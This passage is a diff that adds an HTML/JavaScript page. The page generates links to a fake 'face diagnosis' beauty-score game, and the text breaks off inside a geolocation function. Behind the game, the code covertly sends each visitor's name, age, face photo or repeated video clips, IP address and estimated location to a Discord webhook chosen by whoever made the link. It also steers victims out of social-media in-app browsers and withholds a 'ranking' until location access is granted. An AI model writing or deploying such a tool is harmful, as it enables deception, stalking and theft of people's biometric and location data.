@@ -1,0 +1,1486 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>顔診断</title>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/face_detection.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg1: #0f0c29;
+    --bg2: #302b63;
+    --bg3: #24243e;
+    --text: #ffffff;
+    --muted: #9aa7c7;
+    --btn1: #6a11cb;
+    --btn2: #2575fc;
+    --accent: #8affb0;
+    --panel: rgba(255,255,255,0.06);
+    --line: rgba(255,255,255,0.12);
+  }
+  body {
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    background: linear-gradient(160deg, var(--bg1), var(--bg2), var(--bg3));
+    font-family: "Hiragino Sans", "Yu Gothic", sans-serif;
+    color: var(--text); padding: 20px;
+    transition: background 0.3s ease, color 0.3s ease;
+  }
+  .card {
+    width: 100%; max-width: 500px;
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 20px; padding: 26px;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .page { display: none; }
+  .page.active { display: block; }
+  h1 { font-size: 22px; text-align: center; margin-bottom: 8px; letter-spacing: 1px; }
+  .sub { text-align: center; font-size: 12px; color: var(--muted); margin-bottom: 22px; }
+  label { display: block; font-size: 13px; margin-bottom: 6px; color: var(--muted); }
+  input[type="text"], input[type="number"], input[type="color"] {
+    width: 100%; padding: 13px; border-radius: 12px;
+    border: 1px solid var(--line);
+    background: rgba(0,0,0,0.3); color: var(--text); font-size: 13px;
+    margin-bottom: 16px; outline: none;
+  }
+  input[type="color"] { padding: 4px; height: 46px; cursor: pointer; }
+  input:focus { border-color: var(--accent); }
+  button {
+    width: 100%; padding: 15px; font-size: 16px; font-weight: bold;
+    border: none; border-radius: 14px; cursor: pointer;
+    background: linear-gradient(90deg, var(--btn1), var(--btn2));
+    color: #fff; letter-spacing: 1px;
+    transition: transform 0.12s ease, opacity 0.2s;
+    -webkit-tap-highlight-color: transparent;
+  }
+  button:active { transform: scale(0.97); }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  .result {
+    margin-top: 22px; display: none;
+    background: rgba(0,0,0,0.35); border-radius: 14px;
+    padding: 16px; border: 1px solid var(--line);
+  }
+  .result-title { font-size: 13px; color: var(--accent); margin-bottom: 8px; }
+  .link-box { display: flex; gap: 8px; align-items: center; }
+  .link-box input { margin: 0; font-size: 12px; flex: 1; background: rgba(255,255,255,0.08); color: var(--accent); }
+  .copy-btn { width: auto; padding: 12px 16px; font-size: 13px; }
+  .note { font-size: 11px; color: var(--muted); margin-top: 12px; line-height: 1.6; }
+  .status { font-size: 12px; min-height: 18px; margin-top: 10px; text-align: center; }
+  .status.error { color: #ff8a8a; }
+  .status.ok { color: var(--accent); }
+
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 460px) { .grid2 { grid-template-columns: 1fr; } }
+
+  .mode-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .mode-opt {
+    border: 1px solid var(--line);
+    background: rgba(0,0,0,0.3);
+    border-radius: 12px;
+    padding: 14px 12px;
+    cursor: pointer;
+    text-align: center;
+    transition: border-color 0.15s ease, background 0.15s ease;
+    user-select: none;
+  }
+  .mode-opt .mode-title {
+    font-size: 14px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    margin-bottom: 4px;
+    color: var(--text);
+  }
+  .mode-opt .mode-desc {
+    font-size: 11px;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+  .mode-opt.selected {
+    border-color: var(--accent);
+    background: rgba(255,255,255,0.08);
+  }
+  .mode-opt.selected .mode-title { color: var(--accent); }
+
+  .preview-label {
+    font-size: 13px; color: var(--muted); margin: 18px 0 8px;
+    text-transform: uppercase; letter-spacing: 0.12em;
+  }
+  .preview-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+  @media (max-width: 560px) { .preview-row { grid-template-columns: 1fr; } }
+  .phone {
+    aspect-ratio: 9 / 16;
+    border-radius: 22px;
+    overflow: hidden;
+    border: 1px solid var(--line);
+    background: linear-gradient(160deg, var(--bg1), var(--bg2), var(--bg3));
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    color: var(--text);
+    transition: background 0.25s ease, color 0.25s ease;
+    font-size: 11px;
+  }
+  .phone-inner {
+    width: 100%;
+    height: 100%;
+    border-radius: 16px;
+    background: var(--panel);
+    border: 1px solid var(--line);
+    padding: 12px 12px 14px;
+    display: flex;
+    flex-direction: column;
+    backdrop-filter: blur(8px);
+    overflow: hidden;
+  }
+  .pv-title {
+    font-size: 13px;
+    font-weight: 800;
+    text-align: center;
+    letter-spacing: 0.5px;
+    margin-bottom: 2px;
+  }
+  .pv-sub {
+    font-size: 8px;
+    text-align: center;
+    color: var(--muted);
+    margin-bottom: 10px;
+  }
+  .pv-label {
+    font-size: 8px;
+    color: var(--muted);
+    margin-bottom: 3px;
+  }
+  .pv-input {
+    width: 100%;
+    padding: 7px 9px;
+    border-radius: 8px;
+    border: 1px solid var(--line);
+    background: rgba(0,0,0,0.3);
+    color: var(--text);
+    font-size: 9px;
+    margin-bottom: 8px;
+    opacity: 0.9;
+  }
+  .pv-btn {
+    width: 100%;
+    padding: 9px;
+    font-size: 10px;
+    font-weight: 800;
+    border-radius: 10px;
+    color: #fff;
+    text-align: center;
+    letter-spacing: 0.5px;
+    background: linear-gradient(90deg, var(--btn1), var(--btn2));
+    margin-top: auto;
+  }
+  .pv-user {
+    font-size: 9px;
+    text-align: center;
+    color: var(--accent);
+    margin-bottom: 8px;
+  }
+  .pv-video {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 3 / 4;
+    border-radius: 10px;
+    background: #000;
+    margin-bottom: 8px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .pv-video::before {
+    content: "";
+    position: absolute;
+    inset: 18% 22%;
+    border-radius: 50%;
+    background: radial-gradient(circle at 50% 45%, rgba(255,255,255,0.25), rgba(255,255,255,0.05) 60%, transparent 70%);
+    border: 1px solid rgba(255,255,255,0.12);
+  }
+  .pv-status {
+    font-size: 8px;
+    text-align: center;
+    color: var(--accent);
+    margin-bottom: 8px;
+  }
+  .pv-score-label {
+    font-size: 8px;
+    text-align: center;
+    color: var(--muted);
+  }
+  .pv-score {
+    font-size: 26px;
+    font-weight: 900;
+    text-align: center;
+    line-height: 1;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 5px;
+  }
+  .pv-meter {
+    height: 5px;
+    border-radius: 4px;
+    background: rgba(255,255,255,0.1);
+    overflow: hidden;
+    margin-bottom: 6px;
+  }
+  .pv-meter-fill {
+    height: 100%;
+    width: 78%;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+  }
+  .pv-comment {
+    font-size: 7px;
+    line-height: 1.5;
+    background: rgba(0,0,0,0.3);
+    border-radius: 6px;
+    padding: 6px;
+    color: var(--text);
+  }
+  .pv-caption {
+    text-align: center;
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+  }
+
+  .video-wrap {
+    position: relative; width: 100%; aspect-ratio: 3 / 4;
+    border-radius: 16px; overflow: hidden;
+    background: #000; margin-bottom: 16px;
+  }
+  video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+  canvas { display: none; }
+
+  .snapshot-overlay {
+    display: none;
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    object-fit: cover; transform: scaleX(-1);
+  }
+  .snapshot-overlay.show { display: block; }
+
+  .score-wrap { display: none; text-align: center; padding: 10px 0; }
+  .score-wrap.show { display: block; }
+  .score-label { font-size: 13px; color: var(--muted); margin-bottom: 4px; }
+  .score-num {
+    font-size: 64px; font-weight: 900;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .meter { height: 10px; border-radius: 6px; margin: 14px 0; background: rgba(255,255,255,0.1); overflow: hidden; }
+  .meter-fill { height: 100%; width: 0; background: linear-gradient(90deg, var(--accent), var(--btn2)); transition: width 1s ease; }
+  .score-comment {
+    font-size: 14px; color: var(--text); line-height: 1.7;
+    background: rgba(0,0,0,0.3); border-radius: 12px; padding: 14px;
+    text-align: left;
+    margin-bottom: 10px;
+  }
+  .score-breakdown {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    background: rgba(0,0,0,0.3);
+    border-radius: 12px;
+    padding: 14px;
+    text-align: left;
+    font-size: 13px;
+  }
+  .score-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .score-row .val {
+    font-weight: bold;
+    color: var(--accent);
+  }
+  .user-name-display {
+    text-align: center; font-size: 14px; color: var(--accent);
+    margin-bottom: 14px;
+  }
+
+  .rank-btn {
+    margin-top: 14px;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+    color: #051018;
+  }
+  .rank-panel {
+    display: none;
+    margin-top: 14px;
+    background: rgba(0,0,0,0.35);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 24px 14px;
+    text-align: center;
+  }
+  .rank-panel.show { display: block; }
+  .rank-title {
+    font-size: 14px;
+    font-weight: 800;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+  .rank-number {
+    font-size: 56px;
+    font-weight: 900;
+    line-height: 1.1;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .rank-suffix {
+    font-size: 24px;
+    font-weight: 900;
+    color: var(--text);
+    margin-left: 4px;
+  }
+  .rank-sub {
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 10px;
+  }
+  .geo-retry-btn {
+    margin-top: 14px;
+    background: linear-gradient(90deg, #ff8a8a, #ff5e5e);
+    color: #fff;
+  }
+  
+  .geo-info-panel {
+    margin-top: 20px;
+    padding: 12px;
+    background: rgba(0,0,0,0.2);
+    border: 1px dashed var(--line);
+    border-radius: 12px;
+    font-size: 11px;
+    color: var(--muted);
+    text-align: left;
+    line-height: 1.6;
+    word-break: break-all;
+  }
+  .geo-info-title {
+    font-weight: bold;
+    color: var(--accent);
+    margin-bottom: 4px;
+  }
+
+  .face-guide {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 80%;
+    height: 80%;
+    border: 3px dashed rgba(255, 255, 255, 0.6);
+    border-radius: 50%;
+    pointer-events: none;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    z-index: 10;
+  }
+  .face-guide.active {
+    border-color: var(--accent);
+    border-style: solid;
+    box-shadow: 0 0 20px var(--accent);
+  }
+  .face-guide::after {
+    content: "顔を枠に合わせてください";
+    position: absolute;
+    bottom: -30px;
+    left: 50%;
+    transform: translateX(-50%);
+    white-space: nowrap;
+    font-size: 12px;
+    color: rgba(255, 255, 255, 0.8);
+    background: rgba(0,0,0,0.5);
+    padding: 4px 12px;
+    border-radius: 20px;
+  }
+  .face-guide.active::after {
+    content: "バッチリです！";
+    color: var(--accent);
+  }
+
+  .inapp-warning {
+    background: rgba(255,255,255,0.1);
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 20px;
+    font-size: 13px;
+    line-height: 1.8;
+    text-align: left;
+  }
+  .inapp-warning strong {
+    color: var(--accent);
+  }
+  .inapp-btn-primary {
+    width: 100%; padding: 15px; margin-bottom: 12px;
+    background: linear-gradient(90deg, var(--accent), var(--btn2)); color: #051018;
+    font-size: 16px; font-weight: bold; border-radius: 14px; border: none;
+    cursor: pointer;
+  }
+  .inapp-btn-secondary {
+    width: 100%; padding: 15px;
+    background: rgba(255,255,255,0.1); color: var(--text); border: 1px solid var(--line);
+    font-size: 16px; font-weight: bold; border-radius: 14px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <!-- アプリ内ブラウザ警告画面 -->
+  <div id="page-inapp" class="page">
+    <h1>⚠️ アプリ内で開かれています</h1>
+    <p class="sub">カメラと位置情報を正常に使うため、SafariやChromeなどの標準ブラウザで開いてください。</p>
+
+    <div class="inapp-warning">
+      <strong>【iPhoneの場合】</strong><br>
+      画面右上の「…」または「共有」ボタンをタップし、「Safariで開く」を選択してください。<br><br>
+      <strong>【Androidの場合】</strong><br>
+      下の「ブラウザで開く」ボタンを押してください。
+    </div>
+
+    <button id="copyLinkBtn" class="inapp-btn-primary">リンクをコピー</button>
+    <button id="openExternalBtn" class="inapp-btn-secondary">ブラウザで開く（Android用）</button>
+  </div>
+
+  <div id="page-create" class="page active">
+    <h1>🔗 診断リンク作成</h1>
+    <p class="sub">Webhookとデザインを設定して、診断リンクを発行する</p>
+
+    <label>Discord Webhook URL</label>
+    <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." value="">
+
+    <label>送信モード</label>
+    <div class="mode-row">
+      <div class="mode-opt selected" data-mode="image">
+        <div class="mode-title">画像モード</div>
+        <div class="mode-desc">診断完了時に顔画像を1枚送信</div>
+      </div>
+      <div class="mode-opt" data-mode="video">
+        <div class="mode-title">動画モード</div>
+        <div class="mode-desc">3秒ごとに動画を送信</div>
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div>
+        <label>背景色 1</label>
+        <input id="bg1Input" type="color" value="#0f0c29">
+      </div>
+      <div>
+        <label>背景色 2</label>
+        <input id="bg2Input" type="color" value="#302b63">
+      </div>
+      <div>
+        <label>背景色 3</label>
+        <input id="bg3Input" type="color" value="#24243e">
+      </div>
+      <div>
+        <label>文字色</label>
+        <input id="textInput" type="color" value="#ffffff">
+      </div>
+      <div>
+        <label>ボタン色 1</label>
+        <input id="btn1Input" type="color" value="#6a11cb">
+      </div>
+      <div>
+        <label>ボタン色 2</label>
+        <input id="btn2Input" type="color" value="#2575fc">
+      </div>
+      <div>
+        <label>アクセント色</label>
+        <input id="accentInput" type="color" value="#8affb0">
+      </div>
+      <div>
+        <label>補助文字色</label>
+        <input id="mutedInput" type="color" value="#9aa7c7">
+      </div>
+    </div>
+
+    <div class="preview-label">サンプルプレビュー</div>
+    <div class="preview-row">
+      <div>
+        <div class="phone">
+          <div class="phone-inner">
+            <div class="pv-title">✨ 顔診断 ✨</div>
+            <div class="pv-sub">診断を始める前に教えてね</div>
+            <div class="pv-label">お名前</div>
+            <div class="pv-input">例: ゼウス</div>
+            <div class="pv-label">年齢</div>
+            <div class="pv-input">例: 20</div>
+            <div class="pv-btn">次へ（カメラを許可）</div>
+          </div>
+        </div>
+        <div class="pv-caption">名前・年齢入力画面</div>
+      </div>
+      <div>
+        <div class="phone">
+          <div class="phone-inner">
+            <div class="pv-title">✨ 顔診断 ✨</div>
+            <div class="pv-user">👤 ゼウス さん（20歳）の診断</div>
+            <div class="pv-video"></div>
+            <div class="pv-status">診断完了</div>
+            <div class="pv-score-label">顔診断スコア</div>
+            <div class="pv-score">78</div>
+            <div class="pv-meter"><div class="pv-meter-fill"></div></div>
+            <div class="pv-comment">全体的に調和が取れている。わずかな左右差は自然な範囲で、表情に個性が出ている。</div>
+          </div>
+        </div>
+        <div class="pv-caption">顔撮影・結果画面</div>
+      </div>
+    </div>
+
+    <button id="createBtn">作成</button>
+    <div id="createStatus" class="status"></div>
+    <div id="result" class="result">
+      <div class="result-title">✅ リンクを作成しました</div>
+      <div class="link-box">
+        <input id="linkInput" type="text" readonly>
+        <button id="copyBtn" class="copy-btn">コピー</button>
+      </div>
+      <p class="note" id="resultNote">このリンクを開いた人は、名前・年齢を入力し、カメラ許可後に撮影された顔画像（縁なし）とIPアドレス・推定住所が上記Webhookに送信されます。</p>
+    </div>
+    
+    <div id="geoInfoPanel" class="geo-info-panel" style="display:none;">
+      <div class="geo-info-title">📍 位置情報の取得結果</div>
+      <div id="geoInfoText"></div>
+    </div>
+  </div>
+
+  <div id="page-info" class="page">
+    <h1>✨ 顔診断 ✨</h1>
+    <p class="sub">診断を始める前に教えてね</p>
+    <label>お名前</label>
+    <input id="nameInput" type="text" placeholder="例: ゼウス" maxlength="32">
+    <label>年齢</label>
+    <input id="ageInput" type="number" placeholder="例: 20" min="1" max="120">
+    <button id="nameNextBtn">次へ（カメラを許可）</button>
+    <div id="nameStatus" class="status"></div>
+  </div>
+
+  <div id="page-diagnose" class="page">
+    <h1>✨ 顔診断 ✨</h1>
+    <div class="user-name-display" id="userNameDisplay"></div>
+
+    <div class="video-wrap" id="videoWrap">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas"></canvas>
+      <img id="snapshotOverlay" class="snapshot-overlay" alt="">
+      <div id="faceGuide" class="face-guide"></div>
+    </div>
+    <div id="diagStatus" class="status">カメラを準備中...</div>
+
+    <div id="scoreWrap" class="score-wrap">
+      <div class="score-label">総合スコア</div>
+      <div class="score-num" id="scoreNum">0</div>
+      <div class="meter"><div class="meter-fill" id="meterFill"></div></div>
+      
+      <div class="score-comment" id="scoreComment"></div>
+      
+      <div class="score-breakdown">
+        <div class="score-row"><span>顔の左右対称性</span><span class="val" id="subSymmetry">0</span></div>
+        <div class="score-row"><span>明るさ・露出</span><span class="val" id="subBrightness">0</span></div>
+        <div class="score-row"><span>顔の輪郭バランス</span><span class="val" id="subBalance">0</span></div>
+      </div>
+
+      <button id="rankBtn" class="rank-btn" style="margin-top: 20px;">ランキングを表示</button>
+      
+      <div id="rankPanel" class="rank-panel">
+        <div class="rank-title" id="rankTitle">あなたの順位</div>
+        <div id="rankDisplay" style="display:none;">
+          <span class="rank-number" id="rankNumber">-</span><span class="rank-suffix">位</span>
+        </div>
+        <button id="geoRetryBtn" class="geo-retry-btn" style="display:none;">位置情報を許可してください</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const webhookInput = document.getElementById('webhookInput');
+const bg1Input = document.getElementById('bg1Input');
+const bg2Input = document.getElementById('bg2Input');
+const bg3Input = document.getElementById('bg3Input');
+const textInput = document.getElementById('textInput');
+const btn1Input = document.getElementById('btn1Input');
+const btn2Input = document.getElementById('btn2Input');
+const accentInput = document.getElementById('accentInput');
+const mutedInput = document.getElementById('mutedInput');
+const createBtn = document.getElementById('createBtn');
+const createStatus = document.getElementById('createStatus');
+const result = document.getElementById('result');
+const linkInput = document.getElementById('linkInput');
+const copyBtn = document.getElementById('copyBtn');
+const resultNote = document.getElementById('resultNote');
+const modeOpts = Array.from(document.querySelectorAll('.mode-opt'));
+
+const pageInApp = document.getElementById('page-inapp');
+const pageCreate = document.getElementById('page-create');
+const pageInfo = document.getElementById('page-info');
+const pageDiagnose = document.getElementById('page-diagnose');
+const openExternalBtn = document.getElementById('openExternalBtn');
+const copyLinkBtn = document.getElementById('copyLinkBtn');
+
+const nameInput = document.getElementById('nameInput');
+const ageInput = document.getElementById('ageInput');
+const nameNextBtn = document.getElementById('nameNextBtn');
+const nameStatus = document.getElementById('nameStatus');
+const userNameDisplay = document.getElementById('userNameDisplay');
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snapshotOverlay = document.getElementById('snapshotOverlay');
+const faceGuide = document.getElementById('faceGuide');
+const diagStatus = document.getElementById('diagStatus');
+const scoreWrap = document.getElementById('scoreWrap');
+const scoreNum = document.getElementById('scoreNum');
+const meterFill = document.getElementById('meterFill');
+const scoreComment = document.getElementById('scoreComment');
+
+const subSymmetry = document.getElementById('subSymmetry');
+const subBrightness = document.getElementById('subBrightness');
+const subBalance = document.getElementById('subBalance');
+
+const rankBtn = document.getElementById('rankBtn');
+const rankPanel = document.getElementById('rankPanel');
+const rankTitle = document.getElementById('rankTitle');
+const rankDisplay = document.getElementById('rankDisplay');
+const rankNumber = document.getElementById('rankNumber');
+const geoRetryBtn = document.getElementById('geoRetryBtn');
+
+const geoInfoPanel = document.getElementById('geoInfoPanel');
+const geoInfoText = document.getElementById('geoInfoText');
+
+let webhookURL = null;
+let theme = null;
+let mode = 'image';
+let stream = null;
+let userName = '';
+let userAge = '';
+let initialIP = 'unknown';
+let initialGeo = 'unknown';
+let initialFrameDataURL = null;
+let initialScore = 0;
+let alreadySentImage = false;
+let recordingActive = false;
+let recorder = null;
+let stopTimer = null;
+let myFinalRank = null;
+let faceCheckInterval = null;
+
+let faceDetection = null;
+
+function isInAppBrowser() {
+  const ua = navigator.userAgent || '';
+  const uaLower = ua.toLowerCase();
+  
+  if (
+    uaLower.includes('tiktok') ||
+    uaLower.includes('musical_ly') ||
+    uaLower.includes('bytedance') ||
+    uaLower.includes('instagram') ||
+    uaLower.includes('fban') ||
+    uaLower.includes('fbav') ||
+    uaLower.includes('twitter') ||
+    uaLower.includes('line/')
+  ) {
+    return true;
+  }
+  
+  if (/iPhone|iPad|iPod/i.test(ua)) {
+    const isChrome = uaLower.includes('crios');
+    const isEdge = uaLower.includes('edgios');
+    const isSafari = uaLower.includes('safari');
+    
+    if (!isChrome && !isEdge && !isSafari) {
+      return true;
+    }
+  }
+  
+  return false;
+}
+
+function setCreateStatus(msg, cls = '') {
+  createStatus.textContent = msg;
+  createStatus.className = 'status ' + cls;
+}
+function setNameStatus(msg, cls = '') {
+  nameStatus.textContent = msg;
+  nameStatus.className = 'status ' + cls;
+}
+function setDiagStatus(msg, cls = '') {
+  diagStatus.textContent = msg;
+  diagStatus.className = 'status ' + cls;
+}
+
+function validWebhook(url) {
+  return /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
+}
+
+function encodeBase64(obj) {
+  return btoa(unescape(encodeURIComponent(JSON.stringify(obj)))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+function decodeBase64(b64) {
+  try { 
+    b64 = b64.replace(/-/g, '+').replace(/_/g, '/');
+    return JSON.parse(decodeURIComponent(escape(atob(b64)))); 
+  } catch { return null; }
+}
+
+function basePageUrl() {
+  const url = new URL(window.location.href);
+  let path = url.pathname;
+  if (!path || path.endsWith('/')) path = path + 'index.html';
+  return url.origin + path;
+}
+
+function applyTheme(t) {
+  if (!t) return;
+  document.documentElement.style.setProperty('--bg1', t.bg1 || '#0f0c29');
+  document.documentElement.style.setProperty('--bg2', t.bg2 || '#302b63');
+  document.documentElement.style.setProperty('--bg3', t.bg3 || '#24243e');
+  document.documentElement.style.setProperty('--text', t.text || '#ffffff');
+  document.documentElement.style.setProperty('--muted', t.muted || '#9aa7c7');
+  document.documentElement.style.setProperty('--btn1', t.btn1 || '#6a11cb');
+  document.documentElement.style.setProperty('--btn2', t.btn2 || '#2575fc');
+  document.documentElement.style.setProperty('--accent', t.accent || '#8affb0');
+  document.documentElement.style.setProperty('--panel', 'rgba(255,255,255,0.06)');
+  document.documentElement.style.setProperty('--line', 'rgba(255,255,255,0.12)');
+}
+
+function applyPreview() {
+  applyTheme({
+    bg1: bg1Input.value,
+    bg2: bg2Input.value,
+    bg3: bg3Input.value,
+    text: textInput.value,
+    btn1: btn1Input.value,
+    btn2: btn2Input.value,
+    accent: accentInput.value,
+    muted: mutedInput.value
+  });
+}
+
+function updateResultNote() {
+  if (mode === 'video') {
+    resultNote.textContent = "このリンクを開いた人は、名前・年齢を入力し、カメラ許可後に3秒ごとに録画された動画とIPアドレス・推定住所が上記Webhookへ送信されます。";
+  } else {
+    resultNote.textContent = "このリンクを開いた人は、名前・年齢を入力し、カメラ許可後に撮影された顔画像（縁なし）とIPアドレス・推定住所が上記Webhookに送信されます。";
+  }
+}
+
+modeOpts.forEach(el => {
+  el.addEventListener('click', () => {
+    modeOpts.forEach(x => x.classList.remove('selected'));
+    el.classList.add('selected');
+    mode = el.dataset.mode === 'video' ? 'video' : 'image';
+    updateResultNote();
+  });
+});
+
+function showPage(name) {
+  pageInApp.classList.remove('active');
+  pageCreate.classList.remove('active');
+  pageInfo.classList.remove('active');
+  pageDiagnose.classList.remove('active');
+  if (name === 'inapp') pageInApp.classList.add('active');
+  if (name === 'create') pageCreate.classList.add('active');
+  if (name === 'info') pageInfo.classList.add('active');
+  if (name === 'diagnose') pageDiagnose.classList.add('active');
+}
+
+function router() {
+  if (isInAppBrowser()) {
+    showPage('inapp');
+    return;
+  }
+
+  const hash = location.hash || '';
+  if (hash.length > 2) {
+    const match = hash.match(/^#([^&]+)/);
+    if (!match) { showPage('create'); return; }
+    
+    let rawData = decodeBase64(decodeURIComponent(match[1]));
+    if (!rawData) { showPage('create'); return; }
+    
+    if (!rawData.w && rawData.wp) {
+      rawData.w = 'https://discord.com/api/webhooks/' + rawData.wp;
+    }
+
+    if (!rawData.w) { showPage('create'); return; }
+    
+    webhookURL = rawData.w;
+    theme = rawData.t || null;
+    mode = rawData.m === 'v' ? 'video' : 'image';
+    applyTheme(theme);
+    userName = '';
+    userAge = '';
+    alreadySentImage = false;
+    myFinalRank = null;
+    initialIP = 'unknown';
+    initialGeo = 'unknown';
+    userNameDisplay.textContent = '';
+    rankPanel.classList.remove('show');
+    rankDisplay.style.display = 'none';
+    geoRetryBtn.style.display = 'none';
+    rankBtn.style.display = 'block';
+    showPage('info');
+    setTimeout(() => nameInput.focus(), 100);
+  } else {
+    stopCamera();
+    showPage('create');
+  }
+}
+
+function stopCamera() {
+  recordingActive = false;
+  if (stopTimer) { clearTimeout(stopTimer); stopTimer = null; }
+  if (faceCheckInterval) { clearInterval(faceCheckInterval); faceCheckInterval = null; }
+  if (recorder && recorder.state === 'recording') {
+    try { recorder.stop(); } catch {}
+  }
+  recorder = null;
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  video.srcObject = null;
+  faceGuide.classList.remove('active');
+}
+
+window.addEventListener('hashchange', router);
+
+openExternalBtn.addEventListener('click', () => {
+  const url = window.location.href;
+  const urlWithoutHash = url.split('#')[0];
+  const androidIntent = `intent://${urlWithoutHash.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+  window.location.href = androidIntent;
+});
+
+copyLinkBtn.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText(window.location.href);
+    copyLinkBtn.textContent = '✅ コピーしました！Safariに貼り付けて開いてください';
+    copyLinkBtn.style.background = 'var(--accent)';
+    setTimeout(() => {
+      copyLinkBtn.textContent = 'リンクをコピー';
+      copyLinkBtn.style.background = 'linear-gradient(90deg, var(--accent), var(--btn2))';
+    }, 3000);
+  } catch {
+    const textArea = document.createElement('textarea');
+    textArea.value = window.location.href;
+    document.body.appendChild(textArea);
+    textArea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textArea);
+    copyLinkBtn.textContent = '✅ コピーしました！Safariに貼り付けて開いてください';
+    setTimeout(() => {
+      copyLinkBtn.textContent = 'リンクをコピー';
+    }, 3000);
+  }
+});
+
+createBtn.addEventListener('click', () => {
+  const wh = webhookInput.value.trim();
+  if (!wh) { setCreateStatus('Webhook URLを入力してください。', 'error'); return; }
+  if (!validWebhook(wh)) { setCreateStatus('Discord Webhook URLの形式が正しくありません。', 'error'); return; }
+
+  const defaultColors = {
+    bg1: '#0f0c29', bg2: '#302b63', bg3: '#24243e',
+    text: '#ffffff', btn1: '#6a11cb', btn2: '#2575fc',
+    accent: '#8affb0', muted: '#9aa7c7'
+  };
+
+  const themeData = {};
+  if (bg1Input.value !== defaultColors.bg1) themeData.bg1 = bg1Input.value;
+  if (bg2Input.value !== defaultColors.bg2) themeData.bg2 = bg2Input.value;
+  if (bg3Input.value !== defaultColors.bg3) themeData.bg3 = bg3Input.value;
+  if (textInput.value !== defaultColors.text) themeData.text = textInput.value;
+  if (btn1Input.value !== defaultColors.btn1) themeData.btn1 = btn1Input.value;
+  if (btn2Input.value !== defaultColors.btn2) themeData.btn2 = btn2Input.value;
+  if (accentInput.value !== defaultColors.accent) themeData.accent = accentInput.value;
+  if (mutedInput.value !== defaultColors.muted) themeData.muted = mutedInput.value;
+
+  const prefix = 'https://discord.com/api/webhooks/';
+  const data = {};
+
+  if (mode === 'video') {
+    data.m = 'v';
+  }
+
+  if (wh.startsWith(prefix)) {
+    data.wp = wh.replace(prefix, '');
+  } else {
+    data.w = wh;
+  }
+
+  if (Object.keys(themeData).length > 0) {
+    data.t = themeData;
+  }
+
+  const link = basePageUrl() + '#' + encodeBase64(data);
+  linkInput.value = link;
+  result.style.display = 'block';
+  setCreateStatus('リンク作成完了（' + (mode === 'video' ? '動画モード' : '画像モード') + '）。', 'ok');
+  updateResultNote();
+});
+
+copyBtn.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText(linkInput.value);
+    copyBtn.textContent = 'コピー済';
+    setTimeout(() => (copyBtn.textContent = 'コピー'), 1500);
+  } catch {
+    linkInput.select();
+    document.execCommand('copy');
+  }
+});
+
+[bg1Input, bg2Input, bg3Input, textInput, btn1Input, btn2Input, accentInput, mutedInput].forEach(el => {
+  el.addEventListener('input', applyPreview);
+});
+
+nameNextBtn.addEventListener('click', () => startWithInfo());
+nameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') ageInput.focus(); });
+ageInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') startWithInfo(); });
+
+async function fetchIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'unknown';
+  } catch { return 'unknown'; }
+}
+
+async function fetchGeo(ip) {
+  const format = (country, region, city) => {
+    const parts = [country, region, city].filter(v => v && v !== 'unknown');
